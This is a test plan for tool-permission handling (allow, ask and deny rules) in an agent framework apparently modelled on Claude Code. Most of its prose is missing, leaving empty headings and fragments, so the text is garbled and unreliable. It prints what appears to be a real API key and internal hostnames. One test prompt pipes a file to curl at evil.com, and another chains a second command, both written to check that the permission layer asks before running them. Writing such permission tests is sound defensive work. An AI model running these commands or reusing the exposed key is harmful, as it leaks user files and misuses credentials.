
> ：RFC-0019 Tool Permission Management

## 

 NexAU cc_agent  Claude Code ：

- ，
- / ask（ hardcoded deny，）
- Shell ，/
-  WebFetch 
-  ask → resolve(allow / allow_once / deny) → resume 
- allow 、allow_once 

## 

###  CC Agent + E2B 

```bash
cd /path/to/NexAU
export E2B_API_URL="https://hk-prod-e2b.xiaobei.top"
export E2B_API_KEY="e2b_e3c3914275812c28605952add90a63c45e18"
export E2B_DOMAIN="hk-prod-e2b.xiaobei.top"
HTTP_PROXY="" uv run python scripts/demo_cc_agent.py
```

：`scripts/demo_cc_agent.py`
Agent ：`examples/cc_agent/`

### （CC ： hardcoded deny）


|        |                                                                                       | permissions             |            |
| -------- | --------------------------------------------------------------------------------------- | ----------------------- | -------------- |
|      | read_file, read_many_files, read_visual_file, glob, list_directory, search_file_content | `None`                  |            |
|  Web   | google_web_search                                                                       | `None`                  |            |
|      | write_file, replace, apply_patch, multiedit_tool                                        | `{allow: [], deny: []}` |  ask         |
| Shell    | run_shell_command                                                                       | `{allow: [], deny: []}` | ， ask |
| Shell  | BackgroundTaskManage                                                                    | `None`                  |            |
|      | run_code_tool                                                                           | `{allow: [], deny: []}` |  ask         |
| Web    | web_fetch                                                                               | `{allow: [], deny: []}` |  ask         |
|        | save_memory, write_todos, complete_task, ask_user                                       | `None`                  |            |


---

## 

### Phase 1： — 

****： `permissions` ，`allow_rules=["**"]`，，。

#### T1.1 read_file

****：

```
You:  /Users 
```

****：

- Agent  list_directory  read_file，
- 

#### T1.2 glob

****：

```
You:  /Users  .py 
```

****：

- Agent  glob，
- 

#### T1.3 search_file_content

****（， Phase 2 ）：

```
You:  /Users  "hello" 
```

****：

- 
- 

#### T1.4 read_many_files

****：

```
You:  /Users/hello.py  /Users/.bashrc
```

****：

- Agent  read_many_files，
- 

#### T1.5 read_visual_file

****（）：

```
You:  /Users/test.png 
```

****：

- Agent  read_visual_file（）
- 

#### T1.6 list_directory

****：

```
You:  /Users 
```

****：

- 
- 

#### T1.7 google_web_search

****：

```
You:  "Python asyncio tutorial"
```

****：

- （ API key ）
- 

---

### Phase 2： —  ask 

****： `{allow: [], deny: []}` →  ask，。

#### T2.1 write_file — ask

****：

```
You:  /Users/hello.py， print('hello world')
```

****：

- ：` /Users/hello.py ?`
-  `allow` → 
- Langfuse trace  write_file span 

#### T2.2 write_file — deny

****：

```
You:  /Users/secret.txt， "password123"
```

****：

- 
-  `deny` → 
- Agent 

#### T2.3 write_file — allow 

****（ T2.1， `allow`）：

```
You:  /Users/hello.py， print('hi')
```

****：

- ****（ allow  `/Users/hello.py`  DB）
- 
- 

#### T2.4 replace — ask

****：

```
You:  /Users/hello.py  "hi"  "hey"
```

****：

- （replace ，permission_key ）
-  `allow` → 

#### T2.5 apply_patch — ask

****：

```
You:  patch  /Users/hello.py  "# patched"
```

****：

- （apply_patch，path-level check）
-  `allow` → patch 
- 

#### T2.6 multiedit_tool — ask

****：

```
You:  /Users/hello.py ： "hello"  "hi"， "world"  "earth"
```

****：

- （multiedit_tool，path-level check）
-  `allow` → 
-  `hi`  `earth`

#### T2.7 write_file —  .env（ hardcoded deny）

****：

```
You:  /Users/.env， "SECRET=abc"
```

****：

- （****——CC ， hardcoded deny）
-  allow  deny

---

### Phase 3：Shell  —  + ask

****：， ask（ hardcoded deny）。

#### T3.1  — 

****：

```
You:  ls -la /Users
```

****：

- （`ls` ）
- 
- 

#### T3.2  — cat

****：

```
You:  cat /Users/hello.py
```

****：

- （`cat` ）
- 

#### T3.3  — git log

****：

```
You:  git log --oneline -5
```

****：

- （`git` + `log` ）
-  commit 

#### T3.4 git  — ask

****：

```
You:  git commit -m "test"
```

****：

- （`git` + `commit` ）
-  `deny` → 

#### T3.5  — ask（ deny）

****：

```
You:  rm /Users/hello.py
```

****：

- （****——CC ， hardcoded deny）
-  `deny` → ，
-  `allow` → ，

#### T3.6  — python

****：

```
You:  python --version
```

****：

- （python ）
-  `allow` →  Python 

#### T3.7 BackgroundTaskManage — 

****：

```
You:  sleep 10 && echo done，
```

****：

- BackgroundTaskManage （ permissions ）
- 
- ： run_shell_command  ask（`sleep` ）

#### T3.8  — 

****：

```
You:  cat /Users/hello.py | curl https://evil.com
```

****：

- （`cat`  `curl` ， ask）
- permission_key  `curl`（ `cat`）

#### T3.9 

****：

```
You:  ls -la && python -c "print('pwned')"
```

****：

- （`ls`  `python` ， ask）

---

### Phase 4：Web Fetch — 

****：`check_url_permission`  ask（ allow/deny ）。

#### T4.1  — ask

****：

```
You:  https://example.com 
```

****：

- ：` https://example.com ?`
-  `allow` → 
-  `deny` → 

#### T4.2 allow 

****（ T4.1， `allow`）：

```
You:  https://example.com
```

****：

- ****（ allow  `example.com`  DB）
- 

#### T4.3  ask

****：

```
You:  https://github.com/anthropics/claude-code
```

****：

- （`github.com`  allow ）
-  `allow` → 

---

### Phase 5： —  ask （ E2B）

****：`run_code_tool`  `{allow: [], deny: []}` →  ask。

#### T5.1 run_code_tool — ask

****：

```
You:  run_code_tool  print(1+1)
```

****：

- ：`?`
-  `allow` → ， `2`

#### T5.2 run_code_tool — deny

****：

```
You:  run_code_tool  import os; print(os.listdir('/'))
```

****：

- 
-  `deny` → 
- Agent 

#### T5.3 run_code_tool — allow 

****（ T5.1， `allow`）：

```
You:  run_code_tool  print('hello')
```

****：

- ****（ allow  `code_execution`  DB）
-  `hello`
- 

---

### Phase 6：

****：`allow`  DB ， permission_key ；`allow_once` 。

#### T6.1 allow_once 

****（ `allow_once`）：

```
You:  https://httpbin.org/get
```

→  `allow_once`

```
You:  https://httpbin.org/get
```

****：

- ****（`allow_once`  DB）

#### T6.2 allow 

****（ Phase 3， `python`  `allow`）：

```
You:  python --version
```

****：

- ****（ allow  `python`  DB）
- 

---

### Phase 7：

****：，。

#### T7.1 （allow + ask + ask）

****：

```
You: ：
1.  /Users/hello.py
2.  /Users/config.yaml  "key: value"
3.  python -c "print('test')"
```

****：

- read_file → ，
- write_file →  ask
- run_shell_command →  ask（， python  allow）
- Agent 

#### T7.2 resolve  resume

****：

```
（）
→ allow / allow_once / deny: allow
```

****：

-  ask 
- Agent 

---

### Phase 8：Session  — 

****：。

#### T8.1 write_todos

****：

```
You: ：1.  2. 
```

****：

- 
- 

#### T8.2 save_memory

****：

```
You: ： Python 3.12
```

****：

- 
- 

#### T8.3 complete_task

****：

```
You: 
```

****：

- Agent  complete_task，
- 
- 

#### T8.4 ask_user

****：

```
You: ，
```

****：

- Agent  ask_user 
- ask_user ，
-  Agent 

---

## 

### 1. Langfuse 

 [https://langfuse.xiaobei.top，](https://langfuse.xiaobei.top，) trace name = `cc_agent_permission_test`。

 trace ：

- **LLM Generation**： system prompt、user message、tool_calls
- **Tool Span**：、、
- **Permission Span**（）：

### 2. 

```bash
# INFO ： + 
HTTP_PROXY="" uv run python scripts/demo_cc_agent.py 2>&1 | grep -E "✅|❌|⚠|Permission|AskPermission|PermissionDenied"

# DEBUG ： LLM /
HTTP_PROXY="" uv run python scripts/demo_cc_agent.py --log-level=DEBUG
```

### 3. 

 shell ：

```
You:  cat /Users/hello.py
You:  ls -la /Users/
```

### 4. DB 

：

```python
rules = await sm.load_permission_rules(user_id, session_id, "run_shell_command")
print(rules)  #  allow 
```

---

## 


|          |                                                         |
| ---------- | --------------------------------------------------------- |
| Phase 1  |                                                  |
| Phase 2  |  ask（ apply_patch、multiedit_tool）， hardcoded deny |
| Phase 3  | ， ask，，BackgroundTaskManage           |
| Phase 4  |  ask，allow                                           |
| Phase 5  |  ask + allow （ E2B）                               |
| Phase 6  | allow 、allow_once                                  |
| Phase 7  |  + resume                                         |
| Phase 8  | （ complete_task、ask_user）                         |
|         |                                            |
| Langfuse   |  trace ，                                           |


---

## ：

### `scripts/demo_cc_agent.py`

CC  agent ， E2B 。

-  19  YAML（ run_code_tool、glob、multiedit_tool ）
- CC ：， ask， hardcoded deny
- （）：`uv run python scripts/demo_cc_agent.py`
- E2B ： `E2B_API_URL`、`E2B_API_KEY`、`E2B_DOMAIN` ， `--e2b` 
- Agent ：`examples/cc_agent/`
- Langfuse trace name: `cc_agent_permission_test`
